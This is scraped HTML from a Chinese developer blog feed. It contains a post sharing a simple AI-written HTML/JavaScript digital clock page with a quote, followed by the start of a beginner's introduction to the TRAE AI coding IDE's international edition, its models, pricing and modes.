ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>之前看到类似的时钟工具，ai coding 一个类似的！浏览器全屏显示后，当成屏保，也不错。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/618c2033b5994e8a8b5c3911c8831886~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcm9ja3kxOTE=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769085915&amp;x-signature=80bYvpuwsjr35tXeCA68b9WOV4s%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"zh-CN"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>数字时钟<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
        * {
            <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;
            <span class="hljs-attribute">box-sizing</span>: border-box;
        }

        <span class="hljs-selector-tag">body</span> {
            <span class="hljs-attribute">font-family</span>: <span class="hljs-string">'Arial'</span>, sans-serif;
            <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#ffffff</span>;
            <span class="hljs-attribute">display</span>: flex;
            <span class="hljs-attribute">flex-direction</span>: column;
            <span class="hljs-attribute">align-items</span>: center;
            <span class="hljs-attribute">justify-content</span>: center;
            <span class="hljs-attribute">min-height</span>: <span class="hljs-number">100vh</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;
        }

        <span class="hljs-selector-class">.container</span> {
            <span class="hljs-attribute">text-align</span>: center;
            <span class="hljs-attribute">max-width</span>: <span class="hljs-number">800px</span>;
        }

        <span class="hljs-selector-class">.date</span> {
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">2.5rem</span>;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#666</span>;
            <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">40px</span>;
            <span class="hljs-attribute">font-weight</span>: <span class="hljs-number">300</span>;
        }

        <span class="hljs-selector-class">.clock-container</span> {
            <span class="hljs-attribute">display</span>: flex;
            <span class="hljs-attribute">justify-content</span>: center;
            <span class="hljs-attribute">align-items</span>: center;
            <span class="hljs-attribute">gap</span>: <span class="hljs-number">8px</span>;
            <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">60px</span>;
        }

        <span class="hljs-selector-class">.time-segment</span> {
            <span class="hljs-attribute">position</span>: relative;
            <span class="hljs-attribute">width</span>: <span class="hljs-number">80px</span>;
            <span class="hljs-attribute">height</span>: <span class="hljs-number">120px</span>;
            <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#e0e0e0</span>;
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
            <span class="hljs-attribute">overflow</span>: hidden;
            <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">4px</span> <span class="hljs-number">8px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.1</span>);
        }

        <span class="hljs-selector-class">.time-digit</span> {
            <span class="hljs-attribute">position</span>: absolute;
            <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
            <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;
            <span class="hljs-attribute">display</span>: flex;
            <span class="hljs-attribute">align-items</span>: center;
            <span class="hljs-attribute">justify-content</span>: center;
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">4rem</span>;
            <span class="hljs-attribute">font-weight</span>: bold;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;
        }

        <span class="hljs-selector-class">.time-separator</span> {
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">3rem</span>;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;
            <span class="hljs-attribute">font-weight</span>: bold;
        }

        <span class="hljs-selector-class">.ampm</span> {
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">2.5rem</span>;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;
            <span class="hljs-attribute">margin-left</span>: <span class="hljs-number">15px</span>;
            <span class="hljs-attribute">font-weight</span>: bold;
        }

        <span class="hljs-selector-class">.quote</span> {
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1.2rem</span>;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#666</span>;
            <span class="hljs-attribute">line-height</span>: <span class="hljs-number">1.6</span>;
            <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">20px</span>;
            <span class="hljs-attribute">font-style</span>: italic;
        }

        <span class="hljs-selector-class">.author</span> {
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1rem</span>;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#888</span>;
            <span class="hljs-attribute">text-align</span>: right;
        }

        <span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">768px</span>) {
            <span class="hljs-selector-class">.date</span> {
                <span class="hljs-attribute">font-size</span>: <span class="hljs-number">2rem</span>;
            }

            <span class="hljs-selector-class">.time-segment</span> {
                <span class="hljs-attribute">width</span>: <span class="hljs-number">60px</span>;
                <span class="hljs-attribute">height</span>: <span class="hljs-number">90px</span>;
            }

            <span class="hljs-selector-class">.time-digit</span> {
                <span class="hljs-attribute">font-size</span>: <span class="hljs-number">3rem</span>;
            }

            <span class="hljs-selector-class">.time-separator</span> {
                <span class="hljs-attribute">font-size</span>: <span class="hljs-number">2.5rem</span>;
            }

            <span class="hljs-selector-class">.ampm</span> {
                <span class="hljs-attribute">font-size</span>: <span class="hljs-number">2rem</span>;
            }

            <span class="hljs-selector-class">.quote</span> {
                <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1rem</span>;
            }
        }

        <span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">480px</span>) {
            <span class="hljs-selector-class">.date</span> {
                <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1.5rem</span>;
            }

            <span class="hljs-selector-class">.time-segment</span> {
                <span class="hljs-attribute">width</span>: <span class="hljs-number">45px</span>;
                <span class="hljs-attribute">height</span>: <span class="hljs-number">70px</span>;
            }

            <span class="hljs-selector-class">.time-digit</span> {
                <span class="hljs-attribute">font-size</span>: <span class="hljs-number">2.2rem</span>;
            }

            <span class="hljs-selector-class">.time-separator</span> {
                <span class="hljs-attribute">font-size</span>: <span class="hljs-number">2rem</span>;
            }

            <span class="hljs-selector-class">.ampm</span> {
                <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1.5rem</span>;
            }

            <span class="hljs-selector-class">.quote</span> {
                <span class="hljs-attribute">font-size</span>: <span class="hljs-number">0.9rem</span>;
            }
        }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"date"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"date"</span>&gt;</span>星期二, 九月 23 2025<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"clock-container"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"time-segment"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"time-digit"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"hour1"</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"time-segment"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"time-digit"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"hour2"</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"time-separator"</span>&gt;</span>:<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"time-segment"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"time-digit"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"minute1"</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"time-segment"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"time-digit"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"minute2"</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"time-separator"</span>&gt;</span>:<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"time-segment"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"time-digit"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"second1"</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"time-segment"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"time-digit"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"second2"</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"ampm"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"ampm"</span>&gt;</span>PM<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"quote"</span>&gt;</span>
            "When I get a little money I buy books; and if any is left I buy food and clothes."
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"author"</span>&gt;</span>Desiderius Erasmus<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
        <span class="hljs-comment">// 星期和月份的中文映射</span>
        <span class="hljs-keyword">const</span> weekdays = [<span class="hljs-string">'星期日'</span>, <span class="hljs-string">'星期一'</span>, <span class="hljs-string">'星期二'</span>, <span class="hljs-string">'星期三'</span>, <span class="hljs-string">'星期四'</span>, <span class="hljs-string">'星期五'</span>, <span class="hljs-string">'星期六'</span>];
        <span class="hljs-keyword">const</span> months = [<span class="hljs-string">'一月'</span>, <span class="hljs-string">'二月'</span>, <span class="hljs-string">'三月'</span>, <span class="hljs-string">'四月'</span>, <span class="hljs-string">'五月'</span>, <span class="hljs-string">'六月'</span>, <span class="hljs-string">'七月'</span>, <span class="hljs-string">'八月'</span>, <span class="hljs-string">'九月'</span>, <span class="hljs-string">'十月'</span>, <span class="hljs-string">'十一月'</span>, <span class="hljs-string">'十二月'</span>];
        
        <span class="hljs-keyword">function</span> <span class="hljs-title function_">updateClock</span>(<span class="hljs-params"/>) {
            <span class="hljs-keyword">const</span> now = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();
            
            <span class="hljs-comment">// 获取中文日期</span>
            <span class="hljs-keyword">const</span> year = now.<span class="hljs-title function_">getFullYear</span>();
            <span class="hljs-keyword">const</span> month = now.<span class="hljs-title function_">getMonth</span>();
            <span class="hljs-keyword">const</span> day = now.<span class="hljs-title function_">getDate</span>();
            <span class="hljs-keyword">const</span> weekday = now.<span class="hljs-title function_">getDay</span>();
            
            <span class="hljs-comment">// 设置日期（使用中文格式）</span>
            <span class="hljs-keyword">const</span> dateElement = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'date'</span>);
            dateElement.<span class="hljs-property">textContent</span> = <span class="hljs-string">`<span class="hljs-subst">${weekdays[weekday]}</span>, <span class="hljs-subst">${months[month]}</span> <span class="hljs-subst">${day}</span> <span class="hljs-subst">${year}</span>`</span>;
            
            <span class="hljs-comment">// Get current time</span>
            <span class="hljs-keyword">let</span> hours = now.<span class="hljs-title function_">getHours</span>();
            <span class="hljs-keyword">const</span> minutes = now.<span class="hljs-title function_">getMinutes</span>();
            <span class="hljs-keyword">const</span> seconds = now.<span class="hljs-title function_">getSeconds</span>();
            <span class="hljs-keyword">const</span> ampm = hours &gt;= <span class="hljs-number">12</span> ? <span class="hljs-string">'PM'</span> : <span class="hljs-string">'AM'</span>;
            
            <span class="hljs-comment">// Convert to 12-hour format</span>
            hours = hours % <span class="hljs-number">12</span>;
            hours = hours ? hours : <span class="hljs-number">12</span>; <span class="hljs-comment">// the hour '0' should be '12'</span>
            
            <span class="hljs-comment">// Format time with leading zeros</span>
            <span class="hljs-keyword">const</span> formattedHours = hours.<span class="hljs-title function_">toString</span>().<span class="hljs-title function_">padStart</span>(<span class="hljs-number">2</span>, <span class="hljs-string">'0'</span>);
            <span class="hljs-keyword">const</span> formattedMinutes = minutes.<span class="hljs-title function_">toString</span>().<span class="hljs-title function_">padStart</span>(<span class="hljs-number">2</span>, <span class="hljs-string">'0'</span>);
            <span class="hljs-keyword">const</span> formattedSeconds = seconds.<span class="hljs-title function_">toString</span>().<span class="hljs-title function_">padStart</span>(<span class="hljs-number">2</span>, <span class="hljs-string">'0'</span>);
            
            <span class="hljs-comment">// Update the clock display</span>
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'hour1'</span>).<span class="hljs-property">textContent</span> = formattedHours[<span class="hljs-number">0</span>];
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'hour2'</span>).<span class="hljs-property">textContent</span> = formattedHours[<span class="hljs-number">1</span>];
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'minute1'</span>).<span class="hljs-property">textContent</span> = formattedMinutes[<span class="hljs-number">0</span>];
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'minute2'</span>).<span class="hljs-property">textContent</span> = formattedMinutes[<span class="hljs-number">1</span>];
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'second1'</span>).<span class="hljs-property">textContent</span> = formattedSeconds[<span class="hljs-number">0</span>];
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'second2'</span>).<span class="hljs-property">textContent</span> = formattedSeconds[<span class="hljs-number">1</span>];
            <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'ampm'</span>).<span class="hljs-property">textContent</span> = ampm;
        }
        
        <span class="hljs-comment">// Update clock immediately and then every second</span>
        <span class="hljs-title function_">updateClock</span>();
        <span class="hljs-built_in">setInterval</span>(updateClock, <span class="hljs-number">1000</span>);
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>

</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TRAE 国际版限免开启！一份给新手的入门说明书]]></title>    <link>https://juejin.cn/post/7595142651728527379</link>    <guid>https://juejin.cn/post/7595142651728527379</guid>    <pubDate>2026-01-15T12:51:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595142651728527379" data-draft-id="7595401278466179113" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TRAE 国际版限免开启！一份给新手的入门说明书"/> <meta itemprop="keywords" content="Trae,AI编程,人工智能"/> <meta itemprop="datePublished" content="2026-01-15T12:51:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="飞哥数智谈"/> <meta itemprop="url" content="https://juejin.cn/user/3825956195409223"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TRAE 国际版限免开启！一份给新手的入门说明书
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3825956195409223/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    飞哥数智谈
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T12:51:17.000Z" title="Thu Jan 15 2026 12:51:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>14号上午 <code>TRAE</code> 国际版开启“限免一个月”的活动，吸引了很多新同学。</p>
<p>新同学大多对 <code>TRAE</code> 不太熟悉，因此，我帮大家整理了 <code>TRAE</code> 国际版的一些信息，方便初次接触的同学快速了解。</p>
<p><strong>再次说明，本文适合初次接触 <code>TRAE</code> 国际版的同学。</strong></p>
<p>如果你是老手，请期待后续的文章哈。</p>
<h2 data-id="heading-0">版本：国际版 vs 国内版</h2>
<p><code>TRAE</code> 有两个版本：国际版和国内版。</p>
<p>两者界面风格、使用习惯、功能几乎一样。</p>
<p>最大的区别就是模型不同：</p>
<ul>
<li><strong>国际版</strong>：主要为国际模型，包括顶尖的 GPT-5.2、Gemini-3-Pro等。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/62702db26d354ae4965a05d4e46f2354~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769086277&amp;x-signature=VjdBCQTwyc%2B3KeOnEN4jewqqnuM%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>国内版</strong>：只有国内模型，包括前阵子火热的 K2、GLM-4.7、MiniMax-M2.1等，当然还有字节自有的 Doubao 系列。</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a0a2bcdd6524284a3c134c992c0f6f6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769086277&amp;x-signature=W9jHHzidpa2d1thHGIPbBRCdIJc%3D" alt="" loading="lazy"/></p>
<p>本次活动仅限<strong>国际版</strong>，因为国内版本身就全部免费（免费的国内版可能会有排队的情况）。</p>
<p>国际版收费是按照次数收费的，免费用户会有一定的免费额度，<code>Pro</code> 用户购买的其实是每月600次的快速请求。</p>
<p>注：由于是按照次数收费的，每次对话请求建议不要太小，不然会有些不划算。如果你壕，请不要在意这句话。</p>
<h2 data-id="heading-1">模式：IDE vs SOLO</h2>
<p>不论国际版还是国内版，目前都支持 <code>IDE</code> 和 <code>SOLO</code> 两种模式。</p>
<p>在 <code>TRAE</code> 软件内，可以通过左上角的开关切换两种模式。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/019fafbaa36d47d8b81f2fc92d7b7cf1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOe5ZOl5pWw5pm66LCI:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769086277&amp;x-signature=HWObKNiao%2BEw3tqCR0e7n1Hn9XY%3D" alt="" loading="lazy"/></p>
